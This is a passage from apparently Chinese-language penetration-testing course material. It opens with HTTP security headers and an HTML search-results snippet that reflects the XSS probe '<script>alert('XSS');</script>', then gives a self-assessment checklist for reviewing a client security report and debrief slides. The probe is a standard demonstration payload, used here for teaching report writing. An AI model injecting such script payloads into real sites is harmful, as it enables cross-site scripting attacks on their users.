X-XSS-Protection: 1; mode=block
Strict-Transport-Security: max-age=31536000; includeSubDomains


<div class="search-results">
    <p>Search results for '<script>alert('XSS');</script>':</p>
    <ul>
        <li>No results found</li>
    </ul>
</div>
```

# 5-作业 - 自我评估任务

在继续执行此任务之前，您应该已完成整个报告文档。如果你想制作一个幻灯片来展示给这个虚构的客户，最好也完成它。

如果您在开始编写报告之前查看了任何笔记或以前的课程，那么您希望已经完成了一份体面的工作。以下是您在写作前应该略读的核心章节和课程：

- 写作风格
- 报告内容
- 查找文章
- 评估后客户反馈/评估后会议（用于创建幻灯片）

现在，是时候回顾你的工作，寻找潜在的错误或你可能忽略的领域了。如果你不喜欢，你不必这样做，但如果你这样做，你会从这门课程中得到更多。多次复习材料并分析您的工作将有助于巩固您所学到的知识。当您参与 QA 流程时，这也是很好的做法，可以审查其他人的工作。

以下是要执行的潜在任务列表。请记住，此时报告应为“客户端就绪”。你想在这里深入多少取决于你。

- 查看每个发现：
  - 描述是否清晰，不熟悉发现类型的人会理解所写的内容吗？
  - 描述是否涵盖基本要素？
    - 发现是什么？
    - 为什么不好？
    - 上下文影响是什么？
    - 它是否涵盖任何可能影响问题风险评级的可利用性或缓解点？
  - 该建议是否涵盖基本要素？
    - 它是否包含建议的修复程序？
    - 该发现是否需要任何建议来检查该问题是否在其他地方不存在？
    - 调查结果是否包含任何预防建议？
- 查看执行摘要部分。设身处地为非技术读者着想，以确保他们理解内容。查看该部分时要注意以下几点：
  - 它是否包含对评估内容和评估内容的简要介绍？
  - 它是否包含有关所审查内容的概念风险的任何信息？
  - 它是否适当地涵盖了风险及其业务影响？是否有任何最坏的情况？
- 查看建议部分。设身处地为非技术读者着想，以确保他们理解内容。查看该部分时要注意以下几点：
  - 根据报告的调查结果，是否提到了任何短期建议来帮助消除直接风险？这些也可以在执行摘要的末尾提及
  - 是否提出了长期建议，以防止评估中发现的问题再次发生，或确保在出现问题时予以补救？
  - 有没有提到可以进行的任何进一步评估？

在本课程中，我们介绍了报告中的其他几个部分。考虑结合您所做的任何笔记进行复习，或者浏览适用的课程。确保您已捕获所需的信息并且内容清晰。您可能想要查看的其他部分（应该在报告中）包括：

- 调查结果概述
- 范围
- 警告
- 其他页面：
  - 扉页
  - 目录
  - 变更控制

如果您决定为评估后演示文稿编写幻灯片以供练习，请在复习前浏览适用的课程或检查您的笔记。在所需内容和信息方面需要考虑的一些高级要点：

- 幻灯片是否包含：
  - 介绍
  - 评估概况
  - 调查结果演练
  - 关键要点和建议
- 查看内容的呈现方式：
  - 内容是否简洁
  - 技术人员和非技术人员都清楚内容吗
    - 尽管注意到内容应该由您通过幻灯片进行讨论来提供

希望自我评估任务能突出您在创建报告和查找文章过程中可能忽略的任何差距。记下这些差距有助于防止它们出现在您撰写的后续报告中。当您收到其他人的反馈或提交工作以供审核之前，这是一个很好的过程。

完成此任务后，任务完成，干得好！